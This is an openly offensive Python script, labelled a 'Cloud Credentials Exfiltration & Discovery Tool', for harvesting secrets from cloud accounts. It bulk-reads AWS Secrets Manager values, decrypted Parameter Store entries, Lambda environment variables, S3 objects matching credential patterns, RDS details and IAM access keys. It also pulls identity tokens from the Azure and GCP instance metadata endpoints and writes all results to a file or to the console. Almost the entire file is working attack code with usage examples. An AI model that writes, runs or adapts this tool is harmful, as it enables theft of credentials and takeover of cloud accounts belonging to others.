#!/usr/bin/env python3
"""
Cloud Credentials Exfiltration & Discovery Tool
Automatically discovers and extracts credentials from various cloud sources
"""

import json
import re
import sys
import argparse
import base64
from typing import List, Dict, Optional, Tuple
import boto3
import subprocess


class CredentialExtractor:
    """Extract credentials from cloud services"""
    
    def __init__(self, platform: str, region: str = None):
        self.platform = platform.lower()
        self.region = region or 'us-east-1'
        self.credentials: Dict[str, any] = {}
        
    def initialize_aws(self) -> bool:
        """Initialize AWS session"""
        try:
            self.session = boto3.Session(region_name=self.region)
            self.iam = self.session.client('iam')
            self.sm = self.session.client('secretsmanager')
            self.ssm = self.session.client('ssm')
            self.s3 = self.session.client('s3')
            self.lambda_client = self.session.client('lambda')
            self.rds = self.session.client('rds')
            print(f"[+] AWS session initialized")
            return True
        except Exception as e:
            print(f"[-] AWS initialization failed: {e}")
            return False
    
    def extract_secrets_manager(self, pattern: str = None) -> Dict:
        """Extract secrets from Secrets Manager"""
        extracted = {}
        
        try:
            print("[*] Extracting from Secrets Manager...")
            
            secrets = self.sm.list_secrets()
            
            for secret in secrets.get('SecretList', []):
                secret_name = secret['Name']
                
                # Filter by pattern if provided
                if pattern and not re.search(pattern, secret_name, re.IGNORECASE):
                    continue
                
                try:
                    secret_value = self.sm.get_secret_value(SecretId=secret_name)
                    
                    if 'SecretString' in secret_value:
                        value = secret_value['SecretString']
                        extracted[secret_name] = value
                        print(f"  [+] Extracted: {secret_name}")
                        
                        # Try to parse JSON
                        try:
                            parsed = json.loads(value)
                            for key, val in parsed.items():
                                if key.lower() in ['password', 'token', 'key', 'secret']:
                                    print(f"      -> {key}: {str(val)[:50]}...")
                        except:
                            print(f"      -> Value: {value[:100]}...")
                
                except Exception as e:
                    print(f"  [-] Failed to extract {secret_name}: {e}")
            
            return extracted
        except Exception as e:
            print(f"[-] Secrets Manager extraction failed: {e}")
            return extracted
    
    def extract_parameter_store(self, pattern: str = None) -> Dict:
        """Extract from SSM Parameter Store"""
        extracted = {}
        
        try:
            print("[*] Extracting from Parameter Store...")
            
            paginator = self.ssm.get_paginator('describe_parameters')
            
            for page in paginator.paginate():
                for param in page.get('Parameters', []):
                    param_name = param['Name']
                    
                    if pattern and not re.search(pattern, param_name, re.IGNORECASE):
                        continue
                    
                    try:
                        param_value = self.ssm.get_parameter(
                            Name=param_name,
                            WithDecryption=True
                        )
                        
                        value = param_value['Parameter']['Value']
                        extracted[param_name] = value
                        print(f"  [+] Extracted: {param_name}")
                        
                        if len(value) < 200:
                            print(f"      -> Value: {value}")
                        else:
                            print(f"      -> Value: {value[:100]}...")
                    
                    except Exception as e:
                        print(f"  [-] Failed to extract {param_name}: {e}")
            
            return extracted
        except Exception as e:
            print(f"[-] Parameter Store extraction failed: {e}")
            return extracted
    
    def extract_lambda_env(self) -> Dict:
        """Extract environment variables from Lambda functions"""
        extracted = {}
        
        try:
            print("[*] Extracting from Lambda functions...")
            
            functions = self.lambda_client.list_functions()
            
            for func in functions.get('Functions', []):
                func_name = func['FunctionName']
                
                try:
                    config = self.lambda_client.get_function_configuration(
                        FunctionName=func_name
                    )
                    
                    env_vars = config.get('Environment', {}).get('Variables', {})
                    
                    if env_vars:
                        extracted[func_name] = env_vars
                        print(f"  [+] Found env vars in: {func_name}")
                        
                        for key, value in env_vars.items():
                            if any(keyword in key.lower() for keyword in ['password', 'key', 'secret', 'token', 'api']):
                                print(f"      -> {key}: {str(value)[:50]}...")
                
                except Exception as e:
                    print(f"  [-] Failed to extract from {func_name}: {e}")
            
            return extracted
        except Exception as e:
            print(f"[-] Lambda extraction failed: {e}")
            return extracted
    
    def extract_from_s3(self, bucket_pattern: str = None) -> Dict:
        """Extract credentials from S3 objects"""
        extracted = {}
        
        try:
            print("[*] Searching S3 for credentials...")
            
            buckets = self.s3.list_buckets()
            
            credential_patterns = [
                r'AKIA[0-9A-Z]{16}',  # AWS Access Key
                r'aws_access_key_id\s*=',
                r'password\s*[:=]',
                r'api_key\s*[:=]',
                r'secret\s*[:=]',
            ]
            
            for bucket in buckets.get('Buckets', []):
                bucket_name = bucket['Name']
                
                if bucket_pattern and not re.search(bucket_pattern, bucket_name):
                    continue
                
                print(f"  [*] Scanning bucket: {bucket_name}")
                
                try:
                    objects = self.s3.list_objects_v2(Bucket=bucket_name, MaxKeys=1000)
                    
                    for obj in objects.get('Contents', []):
                        key = obj['Key']
                        
                        # Check if likely contains credentials
                        if any(pattern in key.lower() for pattern in ['config', 'secret', 'password', 'credential', 'key', 'auth']):
                            try:
                                response = self.s3.get_object(Bucket=bucket_name, Key=key)
                                content = response['Body'].read().decode('utf-8', errors='ignore')
                                
                                # Search for credentials
                                for pattern in credential_patterns:
                                    if re.search(pattern, content, re.IGNORECASE):
                                        extracted[f"{bucket_name}/{key}"] = content[:500]
                                        print(f"    [+] Potential credentials found: {key}")
                            
                            except Exception as e:
                                pass
                
                except Exception as e:
                    print(f"  [-] Failed to scan {bucket_name}: {e}")
            
            return extracted
        except Exception as e:
            print(f"[-] S3 extraction failed: {e}")
            return extracted
    
    def extract_rds_passwords(self) -> Dict:
        """Extract RDS master passwords (if accessible)"""
        extracted = {}
        
        try:
            print("[*] Checking RDS instances...")
            
            instances = self.rds.describe_db_instances()
            
            for instance in instances.get('DBInstances', []):
                db_id = instance['DBIdentifier']
                endpoint = instance['Endpoint']['Address']
                port = instance['Endpoint']['Port']
                master_user = instance['MasterUsername']
                
                print(f"  [+] Found RDS instance: {db_id}")
                print(f"      Endpoint: {endpoint}:{port}")
                print(f"      Master User: {master_user}")
                
                # Try to get password from Secrets Manager
                secret_name = f"{db_id}-master-password"
                try:
                    secret = self.sm.get_secret_value(SecretId=secret_name)
                    if 'SecretString' in secret:
                        extracted[db_id] = json.loads(secret['SecretString'])
                        print(f"      [+] Password found in Secrets Manager!")
                except:
                    pass
            
            return extracted
        except Exception as e:
            print(f"[-] RDS extraction failed: {e}")
            return extracted
    
    def extract_iam_keys(self, user_pattern: str = None, include_keys: bool = False) -> Dict:
        """List IAM users and optionally extract access keys"""
        extracted = {}
        
        try:
            print("[*] Extracting IAM credentials...")
            
            users = self.iam.list_users()
            
            for user in users.get('Users', []):
                user_name = user['UserName']
                
                if user_pattern and not re.search(user_pattern, user_name):
                    continue
                
                print(f"  [+] Found IAM user: {user_name}")
                
                if include_keys:
                    try:
                        keys = self.iam.list_access_keys(UserName=user_name)
                        
                        for key in keys.get('AccessKeyMetadata', []):
                            key_id = key['AccessKeyId']
                            status = key['Status']
                            
                            extracted[user_name] = {
                                'AccessKeyId': key_id,
                                'Status': status,
                                'CreateDate': str(key['CreateDate'])
                            }
                            print(f"      -> AccessKeyId: {key_id} ({status})")
                    except Exception as e:
                        print(f"  [-] Failed to get keys for {user_name}: {e}")
            
            return extracted
        except Exception as e:
            print(f"[-] IAM extraction failed: {e}")
            return extracted
    
    def extract_azure_managed_identity(self) -> Dict:
        """Extract Azure Managed Identity credentials"""
        extracted = {}
        
        try:
            print("[*] Attempting to extract Azure Managed Identity...")
            
            # Try to access metadata endpoint (if running in Azure VM)
            import requests
            
            headers = {'Metadata': 'true'}
            url = 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/'
            
            response = requests.get(url, headers=headers, timeout=2)
            
            if response.status_code == 200:
                token_data = response.json()
                extracted['managed_identity_token'] = {
                    'access_token': token_data.get('access_token', '')[:50] + '...',
                    'resource': token_data.get('resource'),
                    'expires_on': token_data.get('expires_on')
                }
                print(f"  [+] Azure Managed Identity token obtained!")
                return extracted
        
        except Exception as e:
            pass
        
        print("[*] Not running in Azure environment or no managed identity")
        return extracted
    
    def extract_gcp_service_account(self) -> Dict:
        """Extract GCP service account from metadata"""
        extracted = {}
        
        try:
            print("[*] Attempting to extract GCP service account...")
            
            import requests
            
            headers = {'Metadata-Flavor': 'Google'}
            
            # Get service account email
            url = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'
            response = requests.get(url, headers=headers, timeout=2)
            
            if response.status_code == 200:
                sa_email = response.text
                extracted['service_account_email'] = sa_email
                print(f"  [+] Service Account: {sa_email}")
                
                # Get identity token
                token_url = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://www.googleapis.com'
                token_response = requests.get(token_url, headers=headers, timeout=2)
                
                if token_response.status_code == 200:
                    extracted['identity_token'] = token_response.text[:50] + '...'
                    print(f"  [+] Identity token obtained!")
        
        except Exception as e:
            pass
        
        return extracted
    
    def export_credentials(self, output_file: str):
        """Export extracted credentials to file"""
        try:
            with open(output_file, 'w') as f:
                json.dump(self.credentials, f, indent=2, default=str)
            print(f"\n[+] Credentials exported to: {output_file}")
        except Exception as e:
            print(f"[-] Failed to export: {e}")
    
    def run_extraction(self, patterns: Dict = None, include_keys: bool = False):
        """Run full extraction"""
        if self.platform == 'aws':
            if not self.initialize_aws():
                return False
            
            print("\n[*] Starting AWS credential extraction...\n")
            
            self.credentials['secrets_manager'] = self.extract_secrets_manager(
                patterns.get('secrets') if patterns else None
            )
            self.credentials['parameter_store'] = self.extract_parameter_store(
                patterns.get('parameters') if patterns else None
            )
            self.credentials['lambda_env'] = self.extract_lambda_env()
            self.credentials['s3_credentials'] = self.extract_from_s3(
                patterns.get('s3_bucket') if patterns else None
            )
            self.credentials['rds_instances'] = self.extract_rds_passwords()
            self.credentials['iam_users'] = self.extract_iam_keys(include_keys=include_keys)
            
            return True
        
        else:
            print(f"[-] Platform {self.platform} not yet supported for automated extraction")
            return False


def main():
    parser = argparse.ArgumentParser(
        description='Cloud Credentials Exfiltration & Discovery Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Extract all available credentials from AWS
  %(prog)s --platform aws --extract-all
  
  # Extract from specific services
  %(prog)s --platform aws --secrets --parameters --lambda-env
  
  # Extract with pattern filtering
  %(prog)s --platform aws --secrets --pattern "prod*"
  
  # Include IAM access keys
  %(prog)s --platform aws --iam-keys
  
  # Export to file
  %(prog)s --platform aws --extract-all --output credentials.json
        '''
    )
    
    parser.add_argument('--platform', required=True, choices=['aws', 'azure', 'gcp'],
                       help='Cloud platform')
    parser.add_argument('--region', default='us-east-1', help='AWS region')
    parser.add_argument('--extract-all', action='store_true',
                       help='Extract from all sources')
    parser.add_argument('--secrets', action='store_true',
                       help='Extract from Secrets Manager')
    parser.add_argument('--parameters', action='store_true',
                       help='Extract from Parameter Store')
    parser.add_argument('--lambda-env', action='store_true',
                       help='Extract from Lambda environment variables')
    parser.add_argument('--s3', action='store_true',
                       help='Search S3 for credentials')
    parser.add_argument('--rds', action='store_true',
                       help='Extract RDS passwords')
    parser.add_argument('--iam-keys', action='store_true',
                       help='Extract IAM access keys')
    parser.add_argument('--pattern', help='Filter pattern')
    parser.add_argument('--s3-bucket', help='Specific S3 bucket pattern')
    parser.add_argument('--output', help='Output file for credentials')
    
    args = parser.parse_args()
    
    extractor = CredentialExtractor(args.platform, args.region)
    
    if args.extract_all:
        extractor.run_extraction(include_keys=args.iam_keys)
    elif args.platform == 'aws':
        print("[*] Starting credential extraction...\n")
        
        if args.secrets:
            extractor.credentials['secrets_manager'] = extractor.extract_secrets_manager(args.pattern)
        if args.parameters:
            extractor.credentials['parameter_store'] = extractor.extract_parameter_store(args.pattern)
        if args.lambda_env:
            extractor.credentials['lambda_env'] = extractor.extract_lambda_env()
        if args.s3:
            extractor.credentials['s3_credentials'] = extractor.extract_from_s3(args.s3_bucket)
        if args.rds:
            extractor.credentials['rds_instances'] = extractor.extract_rds_passwords()
        if args.iam_keys:
            extractor.credentials['iam_users'] = extractor.extract_iam_keys(include_keys=True)
        
        if not any([args.secrets, args.parameters, args.lambda_env, args.s3, args.rds, args.iam_keys]):
            parser.error('At least one extraction option must be specified')
    
    if args.output:
        extractor.export_credentials(args.output)
    else:
        print("\n[+] Extraction complete")
        print(json.dumps(extractor.credentials, indent=2, default=str))


if __name__ == '__main__':
    main()
